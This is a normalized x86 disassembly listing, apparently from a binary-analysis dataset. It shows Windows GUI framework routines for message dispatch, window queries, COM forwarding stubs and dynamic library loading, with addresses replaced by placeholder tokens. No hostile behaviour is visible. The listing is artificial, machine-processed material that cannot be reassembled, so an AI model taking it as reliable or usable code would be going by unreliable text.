push 0xe146
push 0x111
push [ esi + 0x20 ]
call [ SendMessageA@IAT ]
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_40c069
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0xe4 ]
test eax eax
jge r-xdata
call sub_40bba0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx esi
jmp r-xdata
pop esi
leave
retn 0x8
sub_40c0a5
push esi
mov esi ecx
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_40bba0
push 0x0
call sub_40bfa6
test eax eax
jne r-xdata
pop esi
retn 0xc
sub_40c0c6
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ PeekMessageA@IAT ]
mov ebx ecx
mov esi 0x121
jmp r-xdata
push 0x1
push esi
push esi
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
mov ecx ebx
call sub_40bba0
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40c106
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ ebp + 0xc ]
push eax
call sub_40bfa6
test eax eax
je r-xdata
mov ecx esi
call sub_40bba0
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_40c12d
push ebp
mov ebp esp
push ecx
push edi
lea eax [ ebp - 0x4 ]
push eax
xor edi edi
call sub_407eab
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call sub_40ba72
cmp [ eax ] edi
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x3fc0
cmp eax [ ebp + 0xc ]
jne r-xdata
push [ ebp + 0x8 ]
call sub_40bb47
test eax eax
je r-xdata
mov eax edi
pop edi
leave
retn 0x8
call sub_407eab
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call sub_40b9fe
mov edi 0x3fc0
mov edi [ ebp + 0xc ]
jmp r-xdata
sub_40c199
push ebp
mov ebp esp
sub esp 0x10
test [ ebp + 0x10 ] 0x10000000
jne r-xdata
leave
retn 0xc
push esi
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_40ef1c
test eax 0x50000000
jne r-xdata
pop esi
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x20 ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x4
push [ esi + 0x20 ]
call [ GetWindow@IAT ]
push eax
call sub_40bc44
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x11c ]
test eax eax
je r-xdata
mov ecx eax
call sub_40ef50
test eax eax
jne r-xdata
push 0x0
mov ecx esi
call sub_40b767
sub_40c215
push 0x38
mov eax sub_420f7f
call sub_410250
push sub_405503
mov ecx rw-data
call sub_4076fc
mov ebx eax
xor eax eax
xor edx edx
cmp ebx edx
setne al
mov [ ebp - 0x14 ] ebx
cmp eax edx
jne r-xdata
lea eax [ ebx + 0x58 ]
push 0x7
mov esi eax
pop ecx
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
cmp edi 0x2
mov esi [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x60 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x5c ] edi
mov [ ebx + 0x64 ] eax
mov [ ebp - 0x4 ] edx
jne r-xdata
call sub_4054e9
and [ ebp + 0x8 ] 0x0
cmp edi 0x110
jne r-xdata
cmp [ esi + 0x4c ] edx
je r-xdata
push [ ebp + 0x18 ]
mov eax [ esi ]
push [ ebp + 0x14 ]
mov ecx esi
push edi
call [ eax + 0x108 ]
cmp edi 0x110
mov [ ebp + 0x18 ] eax
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_40ab5b
mov ecx [ esi + 0x4c ]
mov eax [ ecx ]
push edx
call [ eax + 0x60 ]
mov eax [ ebp + 0x18 ]
push 0x7
lea edi [ ebx + 0x58 ]
pop ecx
lea esi [ ebp - 0x44 ]
[ edi ] [ esi ]
call sub_4102bc
retn 0x14
push [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_40c199
jmp r-xdata
sub_40c302
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x360
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40bc6b
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ DefWindowProcA@IAT ]
cmp [ eax + 0x20 ] esi
jne r-xdata
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push eax
call sub_40c215
jmp r-xdata
pop esi
sub_40c34d
push 0x4
mov eax sub_420fa2
call sub_41021d
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x20 ] 0x0
je r-xdata
mov ecx [ esi + 0x4c ]
test ecx ecx
je r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp esi rw-data
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_40ea01
call sub_4102bc
retn
cmp [ eax + 0x28 ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
and [ eax + 0x28 ] 0x0
cmp esi rw-data
je r-xdata
call sub_40be83
sub_40c3c2
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_40bba0
lea eax [ ebp + 0xc ]
push eax
call sub_40bfa6
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_40c3ed
push esi
mov esi [ esp + 0xc ]
cmp [ esi ] 0x1
push edi
mov edi ecx
jne r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push esi
push [ edi + 0x20 ]
call sub_40bf2f
test eax eax
je r-xdata
push sub_405503
mov ecx rw-data
call sub_4076fc
test eax eax
jne r-xdata
mov ecx edi
call sub_40bba0
push 0x0
mov ecx eax
call sub_40bfa6
test eax eax
jne r-xdata
mov ecx [ edi + 0x20 ]
cmp [ eax + 0x74 ] ecx
jne r-xdata
call sub_4054e9
pop edi
pop esi
retn 0x8
push ecx
call [ GetMenu@IAT ]
push eax
push [ eax + 0x78 ]
jmp r-xdata
push [ esi + 0x8 ]
push eax
call sub_40ac66
test eax eax
je r-xdata
call sub_40f2f6
test eax eax
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x10 ]
jmp r-xdata
sub_40c472
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi [ GetTopWindow@IAT ]
call edi
jmp r-xdata
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn 0x18
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ SendMessageA@IAT ]
push esi
call sub_40bc6b
test eax eax
je r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x20 ]
push eax
call sub_40c215
jmp r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40c472
sub_40c4ef
push 0x54
mov eax sub_420fc5
call sub_41021d
push 0x0
call sub_40bbd0
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ eax + 0x1c ]
push edi
mov ecx esi
call sub_4088a6
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
mov ecx eax
call sub_40bfa6
push edi
call [ GetParent@IAT ]
push eax
mov ecx esi
call sub_4088a6
test eax eax
je r-xdata
call sub_4102bc
retn 0x8
mov eax [ eax + 0x4c ]
test eax eax
je r-xdata
push edi
lea ecx [ eax + 0x24 ]
call sub_4088a6
mov esi eax
test esi esi
je r-xdata
push edi
lea ecx [ ebp - 0x60 ]
call sub_40a2f5
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x10 ] esi
call sub_40bfa6
and [ ebp - 0x40 ] 0x0
xor ecx ecx
test eax eax
setne cl
or [ ebp - 0x4 ] 0xffffffff
mov esi ecx
lea ecx [ ebp - 0x60 ]
call sub_40c34d
mov eax esi
jmp r-xdata
sub_40c58f
cmp [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
push 0x0
push [ esp + 0x10 ]
call sub_40c4ef
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x2
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_40bba0
sub_40c5bc
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
mov esi ecx
call sub_40c4ef
test eax eax
je r-xdata
mov ecx esi
call sub_40bba0
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_40c5e6
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
mov eax [ eax + 0x8 ]
push [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
mov eax 0x80004003
jmp r-xdata
retn 0x8
sub_40c615
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
mov eax [ eax + 0x8 ]
push [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x20 ]
mov eax 0x80004003
jmp r-xdata
retn 0x8
sub_40c644
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ esp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x24 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c684
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ esp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x28 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c6c4
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ esp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x2c ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c704
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ esp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x30 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c744
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ esp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x34 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c784
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ esp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x38 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c7c4
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ esp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x3c ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c804
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ eax + 0x8 ] ecx
push esi
push edi
jne r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
mov eax 0x80010108
jmp r-xdata
cmp [ ebp + 0x20 ] ecx
je r-xdata
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x1c
push [ ebp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x40 ]
sub_40c84c
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ esp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x44 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c88c
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
mov eax [ eax + 0x8 ]
push [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x48 ]
mov eax 0x80004003
jmp r-xdata
retn 0x8
sub_40c8bb
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
mov eax [ eax + 0x8 ]
push [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
mov eax 0x80004003
jmp r-xdata
retn 0x8
sub_40c8ea
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ esp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x50 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c92a
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ esp + 0x20 ]
lea esi [ esp + 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x54 ]
mov eax 0x80010108
jmp r-xdata
pop edi
pop esi
retn 0x18
sub_40c95c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ eax + 0x8 ] ecx
push esi
push edi
jne r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
mov eax 0x80010108
jmp r-xdata
cmp [ ebp + 0x10 ] ecx
je r-xdata
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x24
cmp [ ebp + 0x14 ] ecx
je r-xdata
cmp [ ebp + 0x18 ] ecx
je r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ ebp + 0x18 ]
lea esi [ ebp + 0x1c ]
push [ ebp + 0x14 ]
movsd [ edi ] [ esi ]
push [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
push [ ebp + 0xc ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x58 ]
sub_40c9b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
cmp [ ebp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x5c ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x1c
sub_40c9f7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x14 ]
mov eax [ eax + 0x8 ]
push [ ebp + 0x10 ]
mov ecx [ eax ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0x60 ]
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x10
sub_40ca2d
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push esi
push edi
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ esp + 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x64 ]
mov eax 0x80010108
jmp r-xdata
pop edi
pop esi
retn 0x14
sub_40ca8a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x28 ]
mov eax [ eax + 0x8 ]
push [ ebp + 0x24 ]
mov ecx [ eax ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0x18 ]
mov eax 0x80010108
jmp r-xdata
pop ebp
retn 0x24
sub_40cac2
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x1c ]
mov eax [ eax + 0x8 ]
push [ ebp + 0x18 ]
mov ecx [ eax ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0x14 ]
mov eax 0x80010108
jmp r-xdata
pop ebp
retn 0x18
sub_40cb12
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
push [ esp + 0x10 ]
mov ecx [ eax ]
push [ esp + 0x10 ]
push eax
call [ ecx + 0x10 ]
mov eax 0x80010108
jmp r-xdata
retn 0x10
sub_40cb6e
push esi
mov esi [ esp + 0xc ]
cmp [ esi ] 0x1
push edi
mov edi ecx
jne r-xdata
push 0x0
push [ esi + 0x14 ]
call sub_40c4ef
test eax eax
jne r-xdata
push [ esi + 0x14 ]
call sub_40f304
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
mov ecx edi
call sub_40bba0
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
sub_40cbab
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
mov esi ecx
call sub_40c4ef
test eax eax
je r-xdata
mov ecx esi
call sub_40bba0
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_40cbf5
push esi
push 0xc
call sub_4086ff
push sub_40c184
mov ecx rw-data
call sub_407359
mov esi eax
test esi esi
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
call sub_4054e9
push 0xc
call sub_40876c
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call [ esi + 0x8 ]
push r--data
call sub_4056e8
test eax eax
pop ecx
mov [ esi + 0x4 ] eax
jne r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
xor eax eax
jmp r-xdata
push [ esi + 0x4 ]
call [ FreeLibrary@IAT ]
and [ esi + 0x4 ] 0x0
jmp r-xdata
pop esi
retn 0x10
sub_40cc73
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx edi ax
shr eax 0x10
xor ebx ebx
cmp [ ebp + 0xc ] ebx
mov esi ecx
mov [ ebp + 0x8 ] eax
jne r-xdata
push sub_405503
mov ecx rw-data
call sub_4076fc
cmp eax ebx
jne r-xdata
cmp edi ebx
jne r-xdata
mov eax [ eax + 0xdc ]
cmp eax [ esi + 0x20 ]
je r-xdata
call sub_4054e9
lea ecx [ ebp - 0x2c ]
call sub_40a4aa
mov eax [ esi ]
push ebx
lea ecx [ ebp - 0x2c ]
push ecx
push 0xffffffff
push edi
mov ecx esi
mov [ ebp - 0x28 ] edi
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
push ebx
push [ ebp + 0xc ]
call sub_40c4ef
test eax eax
jne r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp edi ebx
je r-xdata
mov eax [ esi ]
push ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
push edi
call [ eax + 0xc ]
sub_40cd0a
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ esi ]
push edi
push ebx
mov edi ecx
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
push sub_405503
mov ecx rw-data
mov [ ebp + 0xc ] eax
call sub_4076fc
test eax eax
jne r-xdata
mov eax [ eax + 0xdc ]
cmp eax [ edi + 0x20 ]
jne r-xdata
call sub_4054e9
push [ ebp + 0x10 ]
push ebx
call sub_40c4ef
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
push 0x0
lea ecx [ ebp - 0xc ]
push ecx
movzx ecx [ ebp + 0xc ]
or ecx rw-data
push ecx
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x8 ] esi
call [ eax + 0xc ]
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_40cd8d
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_40bc6b
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov ecx eax
call sub_40cb3b
test eax eax
je r-xdata
push 0x4
push esi
call [ GetWindow@IAT ]
push esi
call [ GetParent@IAT ]
jmp r-xdata
pop esi
retn 0x4
mov eax [ eax + 0x20 ]
jmp r-xdata
sub_40cdd2
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
push esi
mov esi eax
push esi
jmp r-xdata
call sub_40cd8d
test eax eax
jne r-xdata
mov esi eax
push eax
push esi
call sub_40bc44
pop esi
retn
sub_40cdfa
push esi
mov esi ecx
call sub_407eab
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_40ef1c
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x20 ] esi
jne r-xdata
mov ecx esi
pop esi
jmp sub_40bba0
push 0x1
push 0x1
push 0x0
push 0x0
push 0x15
push [ esi + 0x20 ]
call sub_40c472
mov ecx rw-data
call sub_4085e8
sub_40ce40
push esi
mov esi ecx
call sub_407eab
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_40ef1c
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x20 ] esi
jne r-xdata
pop esi
retn 0x4
call sub_40bb62
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x20 ]
call sub_40c472
push [ esp + 0x8 ]
mov ecx eax
call sub_40f39c
sub_40ce8b
push esi
mov esi ecx
call sub_406fbc
cmp eax esi
jne r-xdata
mov ecx esi
call sub_40ef1c
test eax 0x40000000
jne r-xdata
mov ecx rw-data
call sub_40862c
mov ecx esi
call sub_40bba0
pop esi
retn 0x8
call sub_40bb62
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x20 ]
call sub_40c472
sub_40ced4
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x14 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov [ esi + 0x10 ] r--data
call sub_40f44a
mov eax esi
pop esi
retn 0x4
sub_40cf01
mov eax [ esp + 0x4 ]
mov edx [ eax ]
mov ecx [ esp + 0x8 ]
cmp edx [ ecx ]
jne r-xdata
xor eax eax
retn
mov edx [ eax + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ eax + 0xc ]
cmp eax [ ecx + 0xc ]
jne r-xdata
xor eax eax
inc eax
retn
sub_40cf50
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0xc0
jne r-xdata
cmp [ eax + 0xc ] 0x46000000
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
retn 0x4
sub_40cf7b
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
je r-xdata
mov eax 0x80070057
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov ebx [ ebp + 0x14 ]
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
and [ ebx ] 0x0
call sub_40cf50
test eax eax
je r-xdata
mov eax 0x80004003
jmp r-xdata
mov edi [ esi + 0x8 ]
test edi edi
jne r-xdata
mov esi [ esi + 0x4 ]
add esi [ ebp + 0x8 ]
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
mov [ ebx ] esi
xor eax eax
